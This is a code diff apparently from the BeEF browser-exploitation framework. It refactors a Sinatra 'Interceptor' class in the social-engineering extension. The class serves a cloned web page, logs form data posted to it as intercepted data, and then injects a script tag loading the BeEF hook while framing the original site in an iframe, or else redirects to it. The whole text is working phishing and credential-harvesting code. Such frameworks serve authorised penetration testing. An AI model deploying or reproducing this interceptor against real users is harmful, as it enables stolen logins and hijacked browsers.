@@ -16,25 +16,21 @@
 module BeEF
   module Extension
     module SocialEngineering
-
+      require 'sinatra/base'
       class Interceptor < Sinatra::Base
 
-      def initialize(file_path, redirect_to, frameable, beef_hook)
-        super self
-        file = File.open(file_path,'r')
-        @cloned_page = file.read
-        @redirect_to = redirect_to
-        @frameable = frameable
-        @beef_hook = beef_hook
-        file.close
-        print_info "Cloned page with content from [cloned_pages/#{File.basename(file_path)}] initialized."
+      configure do
+          set :show_exceptions, false
       end
 
       # intercept GET
       get "/" do
         print_info "GET request"
         print_info "Referer: #{request.referer}"
-        @cloned_page
+        file = File.open(settings.file_path,'r')
+        cloned_page = file.read
+        file.close
+        cloned_page
       end
 
       # intercept POST
@@ -45,12 +41,12 @@ module BeEF
         print_info "Intercepted data:"
         print_info data
 
-        if @frameable
+        if settings.frameable
           print_info "Page can be framed :-) Loading original URL into iFrame..."
-          "<html><head><script type=\"text/javascript\" src=\"#{@beef_hook}\"></script>\n</head></head><body><iframe src=\"#{@redirect_to}\" style=\"border:none; background-color:white; width:100%; height:100%; position:absolute; top:0px; left:0px; padding:0px; margin:0px\"></iframe></body></html>"
+          "<html><head><script type=\"text/javascript\" src=\"#{settings.beef_hook}\"></script>\n</head></head><body><iframe src=\"#{settings.redirect_to}\" style=\"border:none; background-color:white; width:100%; height:100%; position:absolute; top:0px; left:0px; padding:0px; margin:0px\"></iframe></body></html>"
         else
           print_info "Page can not be framed :-) Redirecting to original URL..."
-          redirect @redirect_to
+          redirect settings.redirect_to
         end
       end
       end
